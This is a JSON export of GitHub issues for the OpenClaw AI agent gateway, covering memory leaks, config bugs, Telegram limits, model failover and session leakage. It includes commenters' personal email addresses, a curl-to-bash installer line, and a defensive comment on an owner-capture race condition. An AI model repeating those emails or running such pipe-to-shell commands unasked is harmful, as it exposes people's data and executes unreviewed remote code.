          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3884794462",
          "createdAt": "2026-02-11T14:29:07Z",
          "updatedAt": "2026-02-11T14:29:07Z",
          "author": "jon-xo",
          "body": "*GitHub Username:* jon-xo\n*Email (for TestFlight):* robotlove@gmail.com\n\n*Use Case:* I'm building a dynamic reminder system that bridges Things 3 tasks with time-based notifications via OpenClaw. When traveling between time zones I want to fire location-aware reminder in local the local time."
        },
        {
          "id": 3884843336,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3884843336",
          "createdAt": "2026-02-11T14:36:43Z",
          "updatedAt": "2026-02-11T14:36:43Z",
          "author": "JKeret",
          "body": "**GitHub Username:** JKeret\n**Email (for TestFlight):** jonathanke@gmail.com\n**Use Case:** Running Clawdbot as a personal AI assistant with voice wake word integration on iOS. Looking to use the companion app for hands-free voice interaction and push notifications from my agent."
        }
      ]
    },
    {
      "number": 6413,
      "title": "CRITICAL: Gateway process massive virtual memory leak (22GB+) - regenerates immediately after restart",
      "body": "## 🐛 Bug Description\n\nThe `openclaw-gateway` process has a **severe virtual memory leak** causing VSZ to balloon to **22+ GB** within minutes of starting. This happens **immediately and consistently** on every restart, even with minimal activity.\n\n## 📊 Environment\n\n| Component | Version/Details |\n|-----------|----------------|\n| **OpenClaw** | 2026.1.30 |\n| **OS** | Ubuntu 24.04 LTS |\n| **Kernel** | Linux 6.8.0-90-generic x64 |\n| **Node.js** | v22.22.0 |\n| **Installation** | npm global (pnpm) |\n| **RAM** | 3.7 GB |\n| **Swap** | 4 GB (added as mitigation) |\n\n## 🔴 Critical Symptoms\n\n### Memory Usage Pattern\n```\nPID       %MEM    VSZ        RSS    COMMAND\n648981    10.7%   22734080   418688 openclaw-gateway\n```\n\n- **VSZ (Virtual Memory):** 22.7 GB and growing\n- **RSS (Physical Memory):** ~400-500 MB (normal)\n- **Growth Rate:** Reaches 22GB within 1-2 minutes of restart\n- **Persistence:** Returns immediately after every restart\n\n### Memory Mapping Analysis\n- Two **8 GB anonymous mappings**\n- Multiple **2 GB anonymous mappings**\n- Numerous **64 MB mappings**\n- Pattern suggests mmap() overcommit or heap fragmentation\n\n## 🔄 Reproduction Steps\n\n1. **Start OpenClaw:** `openclaw gateway start`\n2. **Monitor:** `watch -n 5 'ps aux | grep openclaw-gateway'`\n3. **Observe:** VSZ grows to 22GB within 60-120 seconds\n4. **Restart:** `openclaw gateway restart`\n5. **Result:** Memory returns to 22GB immediately\n\n## ✅ Tested Mitigations (Failed)\n\n| Attempt | Result |\n|---------|--------|\n| Restart gateway | ❌ Leak returns immediately |\n| Clear sub-agents | ❌ Not related to sub-agents |\n| Update to latest (2026.1.30) | ❌ Already on latest, no fix |\n| Check session files | ❌ Session files only ~2MB |\n| Check for zombie processes | ❌ None found |\n| 4GB swap added | ✅ Prevents OOM crashes only |\n\n## 🛡️ Current Workaround\n\n**Auto-heal system implemented:**\n- Monitors gateway VSZ every 5 minutes\n- Triggers restart at 15GB threshold\n- Saves conversation context before restart\n- Commits config changes to git\n- System stable but restart-heavy (~every 10-15 min)\n\n## 📈 Impact Assessment\n\n- **Severity:** 🔴 CRITICAL\n- **System Stability:** At risk without swap\n- **User Experience:** Disrupted by frequent restarts\n- **Data Integrity:** No data loss (context preserved)\n- **Workaround Effectiveness:** 70% (stable but noisy)\n\n## 🔍 Root Cause Hypothesis\n\n1. **Memory-mapped file leak** — mmap() regions not being released\n2. **Node.js heap fragmentation** — V8 heap growing unbounded\n3. **WebSocket connection leak** — Connection objects accumulating\n4. **Event loop accumulation** — Callbacks/events not being cleaned up\n\n## 📎 Additional Context\n\n- **Issue started:** ~2026-02-01 14:00 UTC\n- **First noticed:** During dashboard/Tailscale configuration\n- **Not related to:** Session file bloat, sub-agents, cron jobs\n- **Process count:** Normal (~143 total system processes)\n- **No orphaned Node.js processes detected**\n\n## 🙋 Request\n\n**URGENT:** Please investigate and release a patch. Happy to provide:\n- Heap dumps\n- strace logs\n- Additional diagnostics\n- Testing of fixes\n\n---\n*Reported by: @unchainedio*\n*Affected system: Production deployment*\n",
      "state": "open",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6413",
      "createdAt": "2026-02-01T16:52:20Z",
      "updatedAt": "2026-02-11T14:33:27Z",
      "author": "unchainedio",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3831389254,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6413#issuecomment-3831389254",
          "createdAt": "2026-02-01T16:55:45Z",
          "updatedAt": "2026-02-01T16:55:45Z",
          "author": "unchainedio",
          "body": "## System Information\nDate: Sun Feb  1 04:54:30 PM UTC 2026\nUptime:  16:54:30 up 3 days,  8:54,  2 users,  load average: 0.83, 0.80, 0.73\n\n## Kernel\nLinux moltbot 6.8.0-90-generic #91-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 18 14:14:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n\n## Memory\n               total        used        free      shared  buff/cache   available\nMem:           3.7Gi       1.3Gi       1.3Gi       4.2Mi       1.4Gi       2.4Gi\nSwap:          4.0Gi        34Mi       4.0Gi\n\n## Disk\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        38G   28G  8.5G  77% /\n\n## Node.js Version\nv22.22.0\n\n## NPM Version\n10.9.4\n\n## OpenClaw Version\n2026.1.30\n\n## Gateway Process Details\nmoltbot   648981  1.9 11.8 22772192 464944 ?     Sl   16:05   0:58 openclaw-gateway\n\n## Memory Maps (anonymous only)\n\n## Open File Descriptors (count)\n42\n\n## Process Limits\nMax data size             unlimited            unlimited            bytes     \nMax resident set          unlimited            unlimited            bytes     \nMax open files            524288               524288               files     \n\n## Network Connections (count)\n231\n\n## System Limits\nreal-time non-blocking time  (microseconds, -R) unlimited\ncore file size              (blocks, -c) 0\ndata seg size               (kbytes, -d) unlimited\nscheduling priority                 (-e) 0\nfile size                   (blocks, -f) unlimited\npending signals                     (-i) 15127\nmax locked memory           (kbytes, -l) 8192\nmax memory size             (kbytes, -m) unlimited\nopen files                          (-n) 524288\npipe size                (512 bytes, -p) 8\n"
        },
        {
          "id": 3831524232,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6413#issuecomment-3831524232",
          "createdAt": "2026-02-01T17:37:37Z",
          "updatedAt": "2026-02-01T17:37:37Z",
          "author": "unchainedio",
          "body": "## Update: Root Cause Analysis\n\nAfter further investigation, I've **disabled** both suspected features and the memory leak **still persists**:\n\n### Features Disabled:\n- .compaction.memoryFlush.enabled: false"
        },
        {
          "id": 3831524867,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6413#issuecomment-3831524867",
          "createdAt": "2026-02-01T17:37:44Z",
          "updatedAt": "2026-02-01T17:37:44Z",
          "author": "unchainedio",
          "body": "## Update: Root Cause Analysis\n\nAfter further investigation, I have DISABLED both suspected features and the memory leak STILL PERSISTS:\n\n### Features Disabled:\n- compaction.memoryFlush.enabled: false\n- memorySearch.experimental.sessionMemory: false\n\n### Result After Restart:\n- VSZ: Still 22GB+ immediately after gateway restart\n- RSS: ~430MB (normal)\n\n### Conclusion:\nThe memory leak is NOT caused by memoryFlush or sessionMemory features. The issue is deeper in the openclaw-gateway Node.js process itself.\n\n### Additional Context:\nThe leak appears immediately on process startup - suggesting it may be related to:\n1. Native module loading\n2. Initial memory allocation patterns\n3. Something in the gateway bootstrap process\n4. Possibly related to session storage or compaction logic\n\nThe auto-heal system is managing this by restarting the gateway when VSZ > 15GB, but this is a workaround, not a fix.\n\n---\nTesting environment: OpenClaw 2026.1.30, Node v22.22.0, Ubuntu 22.04"
        },
        {
          "id": 3875455618,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6413#issuecomment-3875455618",
          "createdAt": "2026-02-10T05:41:04Z",
          "updatedAt": "2026-02-10T05:41:04Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3884822332,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6413#issuecomment-3884822332",
          "createdAt": "2026-02-11T14:33:27Z",
          "updatedAt": "2026-02-11T14:33:27Z",
          "author": "aphix",
          "body": "Possibly seeing a similar leak on Debian (via win10 wsl)"
        }
      ]
    },
    {
      "number": 14119,
      "title": "[Bug]: Unable to save changes in the settings",
      "body": "Unable to make any changes via web panel http://127.0.0.1:18789/config in the raw, it always says configuration is wrong and cannot save.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14119",
      "createdAt": "2026-02-11T14:24:54Z",
      "updatedAt": "2026-02-11T14:31:34Z",
      "author": "MikeEntyce",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14121,
      "title": "[Bug]: Model changes back to previously used on openclaw launch, unable to set a new model",
      "body": "## Summary\nWhat went wrong?  \n\nI set the model to gemma2:9b-instruct-q5_K_M in \"~/.openclaw/openclaw.json\" and with \"openclaw config\" and with \"ollama launch clawdbot --config\", but then every time I run openclaw launch it overwrites openclaw.json with llama3.2:3b` model.\n\nWhen trying to change the primary model in the config file to a new one (e.g., `gemma2:9b-instruct-q5_K_M`), running `ollama launch openclaw` overwrites the config file's `\"primary\"` field back to the default `llama3.2:3b` and loads that model instead, ignoring the manual changes. This seems like a cache or fallback mechanism in the launch command.\n\n\n## Steps to reproduce\n1. Set the primary model to something new in `~/.openclaw/openclaw.json` (e.g., change `\"primary\": \"ollama/llama3.2:3b\"` to `\"ollama/gemma2:9b-instruct-q5_K_M\"` and update the models array accordingly). Save the file.  \n2. Run `ollama launch clawdbot --config` to confirm and apply the change (select the new model if prompted).  \n3. Run `ollama launch openclaw` (without `--config`).  \n\n## Expected behavior\nWhat did you expect to happen?  \nThe launch command should respect the existing config file and load the manually set primary model (`gemma2:9b-instruct-q5_K_M`), without overwriting it or falling back to `llama3.2:3b`.\n\n## Actual behavior\nWhat actually happened?  \nThe launch command overwrites `~/.openclaw/openclaw.json` with `\"primary\": \"ollama/llama3.2:3b\"`, logs `[gateway] agent model: ollama/llama3.2:3b`, and loads that model instead. The manual changes are lost, as if there's a cache or hardcoded default.\n\n## Environment\n- Clawdbot version: 2026.2.9  \n- OS: Ubuntu in WSL2 (Windows 11 Pro host)  \n- Install method (pnpm/npx/docker/etc): Installed via curl installer (`curl -fsSL https://openclaw.ai/install.sh | bash`)\n\n## Logs or screenshots\nPaste relevant logs or add screenshots (redact secrets).  \nWhen running `ollama launch openclaw`:  \n```\nLaunching OpenClaw with llama3.2:3b...  \n2026-02-11T10:02:15.785Z [canvas] host mounted at http://127.0.0.1:18789/__openclaw__/canvas/ (root /home/mike/.openclaw/canvas)  \n2026-02-11T10:02:15.815Z [heartbeat] started  \n2026-02-11T10:02:15.819Z [gateway] agent model: ollama/llama3.2:3b  \n```\n\nConfig before launch (shows `gemma2:9b-instruct-q5_K_M`):  \n```\nmike@Mike-PC:~$ cat ~/.openclaw/openclaw.json | grep -A 5 primary  \n        \"primary\": \"ollama/gemma2:9b-instruct-q5_K_M\"  \n```\n\nAfter launch, config is overwritten back to `llama3.2:3b`.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14121",
      "createdAt": "2026-02-11T14:29:31Z",
      "updatedAt": "2026-02-11T14:29:31Z",
      "author": "im-mike",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 5787,
      "title": "Telegram: setMyCommands fails with BOT_COMMANDS_TOO_MUCH when skills exceed 100 command limit",
      "body": "OpenClaw registers all user-invocable skills as Telegram bot commands via `setMyCommands`, but doesn't enforce Telegram's 100 command limit. With 52+ bundled skills plus custom agent skills, this easily exceeds the limit, causing repeated failures on every gateway startup.\n\n## Reproduction\n\n1. Install OpenClaw with default bundled skills (52+)\n2. Add a few agents with custom skills\n3. Connect Telegram channel\n4. Observe logs on startup:\n\n```\n[telegram] [default] starting provider (@jbiggles_bot)\n[telegram] setMyCommands failed: Call to 'setMyCommands' failed! (400: Bad Request: BOT_COMMANDS_TOO_MUCH)\n```\n\n## Expected Behavior\n\nOpenClaw should either:\n- Respect Telegram's 100 command limit by prioritizing/truncating commands\n- Not register skills as Telegram commands by default (agent handles via natural language)\n- Warn users when command count exceeds the limit\n\n## Actual Behavior\n\n- `setMyCommands` fails silently (caught and ignored)\n- Error repeats on every startup and config reload\n- Bot menu shows no commands (or stale commands)\n- No warning to user about the limit being exceeded\n\n## Environment\n\n- OpenClaw version: 2026.1.29\n- Platform: Linux (Docker)\n- Skills: 52 bundled + ~30 custom across 5 agents\n\n## Analysis\n\n**Telegram API limit:** [Telegram Bot API docs](https://core.telegram.org/api/bots/commands) state `setMyCommands` accepts \"at most 100 commands\".\n\n**No limit enforcement in OpenClaw:** In [`src/telegram/bot-native-commands.ts:325-339`](https://github.com/openclaw/openclaw/blob/main/src/telegram/bot-native-commands.ts#L325-L339):\n\n```typescript\nconst allCommands: Array<{ command: string; description: string }> = [\n  ...nativeCommands.map((command) => ({\n    command: command.name,\n    description: command.description,\n  })),\n  ...pluginCommands,\n  ...customCommands,\n];\n\nif (allCommands.length > 0) {\n  withTelegramApiErrorLogging({\n    operation: \"setMyCommands\",\n    runtime,\n    fn: () => bot.api.setMyCommands(allCommands),  // No limit check\n  }).catch(() => {});\n```\n\n**Default registers ALL skills:** [`listSkillCommandsForAgents()`](https://github.com/openclaw/openclaw/blob/main/src/auto-reply/skill-commands.ts#L39-L62) returns every skill where `userInvocable !== false` across all agents - no Telegram-specific filtering.\n\n## Suggested Fix\n\n**Option A: Enforce limit with prioritization**\n\n```typescript\nconst TELEGRAM_MAX_COMMANDS = 100;\n\nconst allCommands = [\n  ...nativeCommands,  // Priority 1: native commands\n  ...pluginCommands,  // Priority 2: plugin commands\n  ...customCommands,  // Priority 3: user custom commands\n];\n\nif (allCommands.length > TELEGRAM_MAX_COMMANDS) {\n  runtime.warn?.(\n    `Telegram limits bots to ${TELEGRAM_MAX_COMMANDS} commands. ` +\n    `${allCommands.length} commands configured; registering first ${TELEGRAM_MAX_COMMANDS}. ` +\n    `Set channels.telegram.commands.native: false to disable, or use channels.telegram.commands.skills: [] to filter.`\n  );\n}\n\nconst commandsToRegister = allCommands.slice(0, TELEGRAM_MAX_COMMANDS);\n```\n\n**Option B: Don't register skills as commands by default**\n\nAdd opt-in for skill command registration via SKILL.md frontmatter:\n\n```yaml\n---\ntelegram-command: true  # Explicitly opt-in to Telegram menu\n---\n```\n\nMost skills work perfectly via natural language - the agent reads SKILL.md and executes appropriately. Telegram command menu registration should be opt-in, not automatic.\n\n**Option C: Add config to control skill command registration**\n\n```json5\n{\n  channels: {\n    telegram: {\n      commands: {\n        native: true,           // existing\n        skills: false,          // NEW: disable skill commands (default: true for backwards compat)\n        // or whitelist:\n        skills: [\"weather\", \"canvas\", \"summarize\"],\n        maxCommands: 100,       // NEW: explicit limit with warning\n      }\n    }\n  }\n}\n```\n\n## Workaround\n\nUntil fixed, users can disable native command registration:\n\n```json5\n{\n  channels: {\n    telegram: {\n      commands: {\n        native: false\n      },\n      customCommands: []\n    }\n  }\n}\n```\n\nThis clears the command menu entirely. Agent still handles all skills via natural language.\n\n## Impact\n\n- **Severity:** Medium - bot still functions, but command menu broken\n- **Frequency:** Every startup/reload for users with many skills\n- **User confusion:** No indication why commands aren't appearing",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5787",
      "createdAt": "2026-02-01T00:00:09Z",
      "updatedAt": "2026-02-11T14:27:01Z",
      "author": "battman21",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875632857,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5787#issuecomment-3875632857",
          "createdAt": "2026-02-10T06:34:16Z",
          "updatedAt": "2026-02-10T06:34:16Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3884780855,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5787#issuecomment-3884780855",
          "createdAt": "2026-02-11T14:27:00Z",
          "updatedAt": "2026-02-11T14:27:00Z",
          "author": "Jackten",
          "body": "Still hitting this on v2026.2.9 (ae99e656a). Gateway logs on every startup:\n\n```\n[telegram] setMyCommands failed: Call to 'setMyCommands' failed! (400: Bad Request: BOT_COMMANDS_TOO_MUCH)\n```\n\nRunning 32 eligible skills + 2 Telegram bot accounts (default + sage). Option A (enforce limit with prioritization) seems like the cleanest fix — native commands first, then truncate with a warning.\n\nWould be happy to see this addressed before it gets auto-closed as stale."
        }
      ]
    },
    {
      "number": 14120,
      "title": "[Bug]: Cannot add custom openrouter/@preset/kimi-2-5 path in the allowed model list",
      "body": "I created a custom preset at https://openrouter.ai/settings/presets/ to force the cheapest provider for KIMI 2.5 and the path that openrouter gives me contains \"@\" which is missinterpreted by openclaw as auth:\n\"The conflict: OpenClaw uses @ for auth profiles, so @preset/kimi-2-5 breaks.\"   ",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14120",
      "createdAt": "2026-02-11T14:26:44Z",
      "updatedAt": "2026-02-11T14:26:44Z",
      "author": "NotMainstream",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 4992,
      "title": "[Bug]: Model 404 errors not triggering failover - causes Telegram bot to hang indefinitely",
      "body": "## Bug Description\n\nWhen a configured model returns a 404 \"not found\" error (e.g., deprecated Google Gemini models like `gemini-1.5-pro`), the error is **not classified as a failover reason**, causing the embedded agent to hang indefinitely instead of falling back to alternative models.\n\nThis was detected and diagnosed by **Claude (Anthropic AI)** during a live debugging session on a production OpenClaw instance.\n\n## Environment\n\n- **OpenClaw version**: 2026.1.29\n- **Node.js version**: 22.22.0\n- **OS**: Ubuntu 24.04.3 LTS\n- **Channel**: Telegram\n- **Provider**: Google (Gemini API)\n\n## Steps to Reproduce\n\n1. Configure OpenClaw with a deprecated/removed model in `openclaw.json`:\n   ```json\n   {\n     \"models\": {\n       \"providers\": {\n         \"google\": {\n           \"models\": [{ \"id\": \"gemini-1.5-pro\", ... }]\n         }\n       }\n     },\n     \"agents\": {\n       \"defaults\": {\n         \"model\": {\n           \"primary\": \"google/gemini-2.5-pro\",\n           \"fallbacks\": [\"google/gemini-1.5-pro\"]\n         }\n       }\n     }\n   }\n   ```\n\n2. Send a message via Telegram\n\n3. Observe that the bot starts processing but **never responds**\n\n4. Check logs - you'll see repeated `embedded run start` entries but no `embedded run end`\n\n5. Check Telegram API - `pending_update_count` keeps increasing as messages queue up\n\n## Actual API Error\n\n```bash\ncurl -X POST 'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key=...' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"contents\":[{\"parts\":[{\"text\":\"Hi\"}]}]}'\n```\n\nReturns:\n```json\n{\n  \"error\": {\n    \"code\": 404,\n    \"message\": \"models/gemini-1.5-pro is not found for API version v1beta, or is not supported for generateContent.\",\n    \"status\": \"NOT_FOUND\"\n  }\n}\n```\n\n## Root Cause Analysis\n\nIn `src/agents/pi-embedded-helpers/errors.ts`, the `classifyFailoverReason()` function does not handle 404/model-not-found errors:\n\n```typescript\nexport function classifyFailoverReason(raw: string): FailoverReason | null {\n  if (isImageDimensionErrorMessage(raw)) return null;\n  if (isImageSizeError(raw)) return null;\n  if (isRateLimitErrorMessage(raw)) return \"rate_limit\";\n  if (isOverloadedErrorMessage(raw)) return \"rate_limit\";\n  if (isCloudCodeAssistFormatError(raw)) return \"format\";\n  if (isBillingErrorMessage(raw)) return \"billing\";\n  if (isTimeoutErrorMessage(raw)) return \"timeout\";\n  if (isAuthErrorMessage(raw)) return \"auth\";\n  return null;  // <-- 404 errors fall through here, no failover triggered\n}\n```\n\nCurrent `ERROR_PATTERNS` covers: `rateLimit`, `overloaded`, `timeout`, `billing`, `auth`, `format`\n\n**Missing**: 404 / model not found errors\n\n## Proposed Fix\n\n### 1. Add to `src/agents/pi-embedded-helpers/types.ts`:\n\n```typescript\nexport type FailoverReason = \"auth\" | \"format\" | \"rate_limit\" | \"billing\" | \"timeout\" | \"model_not_found\" | \"unknown\";\n```\n\n### 2. Add to `ERROR_PATTERNS` in `errors.ts`:\n\n```typescript\nconst ERROR_PATTERNS = {\n  // ... existing patterns ...\n  modelNotFound: [\n    /\\b404\\b/,\n    \"not found\",\n    \"model not found\",\n    \"is not found for API version\",\n    \"does not exist\",\n    \"model is not available\",\n    \"is not supported for\",\n    \"NOT_FOUND\",\n  ],\n} as const;\n```\n\n### 3. Add detection function:\n\n```typescript\nexport function isModelNotFoundErrorMessage(raw: string): boolean {\n  return matchesErrorPatterns(raw, ERROR_PATTERNS.modelNotFound);\n}\n```\n\n### 4. Update `classifyFailoverReason`:\n\n```typescript\nexport function classifyFailoverReason(raw: string): FailoverReason | null {\n  if (isImageDimensionErrorMessage(raw)) return null;\n  if (isImageSizeError(raw)) return null;\n  if (isRateLimitErrorMessage(raw)) return \"rate_limit\";\n  if (isOverloadedErrorMessage(raw)) return \"rate_limit\";\n  if (isCloudCodeAssistFormatError(raw)) return \"format\";\n  if (isBillingErrorMessage(raw)) return \"billing\";\n  if (isTimeoutErrorMessage(raw)) return \"timeout\";\n  if (isAuthErrorMessage(raw)) return \"auth\";\n  if (isModelNotFoundErrorMessage(raw)) return \"model_not_found\";  // <-- ADD THIS\n  return null;\n}\n```\n\n## Impact\n\nThis bug affects any user who:\n- Has deprecated models in their config (Google frequently deprecates Gemini models)\n- Uses providers that return 404 for unavailable models\n- Relies on fallback chains for resilience\n\nThe bot becomes completely unresponsive until manual intervention (config edit + restart).\n\n## Workaround\n\nManually update `openclaw.json` to remove deprecated models and use only currently available ones:\n\n```bash\n# List available Google models\ncurl -s 'https://generativelanguage.googleapis.com/v1beta/models?key=YOUR_KEY' | grep '\"name\"'\n\n# Current valid models (as of Jan 2026):\n# - gemini-2.5-pro\n# - gemini-2.5-flash  \n# - gemini-2.0-flash\n```\n\n## Related Issues\n\n- #4338 - Gateway crashes on unhandled fetch failure\n- #4599 - Sub-agent runs silently die on TypeError: fetch failed\n- #3475 - Models fail silently (hangs)\n\n---\n\n*This issue was detected and fully diagnosed by Claude (Anthropic AI) via Claude Code CLI during a live production debugging session.*",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4992",
      "createdAt": "2026-01-30T22:48:53Z",
      "updatedAt": "2026-02-11T14:25:55Z",
      "author": "taieb1919",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881047129,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4992#issuecomment-3881047129",
          "createdAt": "2026-02-10T22:19:31Z",
          "updatedAt": "2026-02-10T22:19:31Z",
          "author": "jpreed2",
          "body": "I'm experiencing this problem when using the openrouter auto router.  If it can't find a matching model for whatever reason, it returns a 404 and the agent hangs and does not try one of the fallback models."
        },
        {
          "id": 3884773623,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4992#issuecomment-3884773623",
          "createdAt": "2026-02-11T14:25:55Z",
          "updatedAt": "2026-02-11T14:25:55Z",
          "author": "lukemdanastasi",
          "body": "just happened to me switching models"
        }
      ]
    },
    {
      "number": 7679,
      "title": "Telegram should default to allowlist mode with owner ID",
      "body": "## Summary\n\nThe current default `dmPolicy: pairing` for Telegram allows anyone to message the bot and request access via a pairing code. This creates a security concern where random users could potentially get paired if someone approves them accidentally.\n\n## Suggested Change\n\nDefault to `dmPolicy: allowlist` with the owner's Telegram ID auto-captured during onboarding.\n\nThe setup wizard already asks you to message the bot to complete pairing — it could capture that user's ID right there and:\n1. Set `dmPolicy: allowlist`\n2. Add the owner's Telegram ID to `allowFrom`\n\nThis would be a safer default while still being easy to configure for multi-user setups.\n\n## Current Behavior\n\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"dmPolicy\": \"pairing\"\n    }\n  }\n}\n```\n\n## Proposed Behavior\n\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"dmPolicy\": \"allowlist\",\n      \"allowFrom\": [\"<owner-telegram-id>\"]\n    }\n  }\n}\n```\n\n---\n\n*Filed via Clawdbot assistant*",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7679",
      "createdAt": "2026-02-03T03:30:36Z",
      "updatedAt": "2026-02-11T14:24:01Z",
      "author": "jregalbuto",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "onboarding",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3884761233,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7679#issuecomment-3884761233",
          "createdAt": "2026-02-11T14:24:00Z",
          "updatedAt": "2026-02-11T14:24:00Z",
          "author": "I0bster",
          "body": "> **Note: Verify sender identity during wizard capture**\n\nThe `dmPolicy` change from `\"pairing\"` to `\"allowlist\"` is a solid security improvement.\n\nHowever, the auto-capture step should **not** blindly accept the first inbound Telegram message as the owner. A short race window exists between the wizard displaying “message the bot” and the owner actually sending the message. If the bot’s handle is known, an attacker could message during this window and be captured as the owner.\n\n### Suggested mitigation\nGenerate a short random token, display it in the wizard UI, and instruct the user to send **that exact token** to the bot. Only capture the sender’s ID if the message content matches the token.\n\n- You already have a token generator in `src/agents/pairing-store.ts` (code generator at ~line `180`)\n- This eliminates the race condition and reuses existing code\n\n### Footgun to be aware of: empty allowlist semantics\nThere’s an inconsistency in `src/telegram/bot-access.ts`:\n- `isSenderAllowed` treats **empty allowlists as “allow all”** (~line `52`)\n- `resolveSenderAllowMatch` treats **empty allowlists as “allow none”** (~line `77`)\n\nThe DM access control at `bot-message-context.ts:243-244` correctly uses the latter path, but please keep this difference in mind when testing **empty-allowlist + new default** behavior.\n\n---\n\nThe default change itself is clean. The only flag is ensuring the wizard capture step includes sender verification."
        }
      ]
    },
    {
      "number": 14117,
      "title": "[Bug]: Session Isolation & Message Attribution Failure",
      "body": "## Summary\n\nSummary\nMultiple serious issues with session isolation and message attribution causing:\n\nMessages from main session leaking into remote Triager sessions\nRaw cron job internals exposed to user instead of clean notifications\nAutomated messages misattributed as user input\nEnvironment\nHost: Mac mini (Darwin 25.2.0 arm64)\nOpenClaw: Latest version\nConnections: Direct (main session) + Remote via Tailscale (Triager)\nModel: anthropic/claude-sonnet-4-20250514\nIssue 1: Session Crossover\nProblem: Messages sent to main session agent appearing in remote Triager session as if user sent them to Triager.\n\nEvidence: Screenshot shows user's message \"The conversation has grown quite long. I'll compress older parts while preserving recent context...\" appearing in Triager chat, but user only sent this to main session.\n\nSecurity Impact: Private conversations in main session are visible in remote sessions.\n\nIssue 2: Raw Cron Job Output\nProblem: Automated tasks displaying internal system prompts to user instead of clean notifications.\n\nEvidence: Screenshot shows raw cron job instructions like:\n\nStats: runtime 1m12s • tokens 66.2k (in 79 / out 3.3k) • sessionKey agent:bug-fix-triager:cron:4140c068-894a-4643-b47c-913aa2d6c1d7:run:89b27559-257e-4121-a452-6d49bca5b80d\nExpected: Clean user-facing notifications about completed tasks.\n\nIssue 3: Message Attribution Confusion\nProblem: System cannot distinguish between:\n\nUser's actual messages to Triager\nUser's messages to main agent that leak over\nSystem-generated automated content\nImpact: Agent may respond to \"user\" messages that user never sent.\n\n## Steps to reproduce\n\nReproduction Steps\n1, Start main session conversation\n2. Connect remotely via Tailscale (triggers Triager)\n3. Have active cron jobs with delivery configured\n4. Send messages in main session\n5. Observe messages appearing in remote session\n6. Check cron job output for raw technical details\n\nActive Cron Jobs (Temporarily Disabled)\nAgent Overnight Workshop (4140c068-894a-4643-b47c-913aa2d6c1d7)\nAgent Weekend Workshop (0bacd71b-b1ad-4c31-985e-5553c175bbae)\nBoth configured with:\n\nsessionTarget: \"isolated\"\ndelivery: { mode: \"announce\", channel: \"imessage\", to: \"[USER_PHONE]\" }\n\n## Expected behavior\n\nExpected Behavior\nSession Isolation: Messages in main session should never appear in remote sessions\nClean Notifications: Cron jobs should send user-friendly summaries, not raw debug output\nProper Attribution: System should clearly distinguish user input from automated content\n\nPriority\nCritical - This affects both security (private message leakage) and core functionality (message attribution). Users cannot trust that their private conversations remain private or that their input is properly identified.\n\n## Actual behavior\n\nMessages from main session leaking into remote Triager sessions\nRaw cron job internals exposed to user instead of clean notifications\nAutomated messages misattributed as user input\n\n## Environment\n\nOpenClaw version: 2026.2.9\nOS: macOS (Darwin 25.2.0 arm64)\nInstall method: Homebrew (npm package)\nHost: Mac mini\nNode.js: v25.5.0\nConnections: Direct (main session) + Remote via Tailscale (Triager)\nModel: anthropic/claude-sonnet-4-20250514\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n\n<img width=\"456\" height=\"829\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/28830354-bec0-4f01-bec6-4a8e33a211d0\" />\n<img 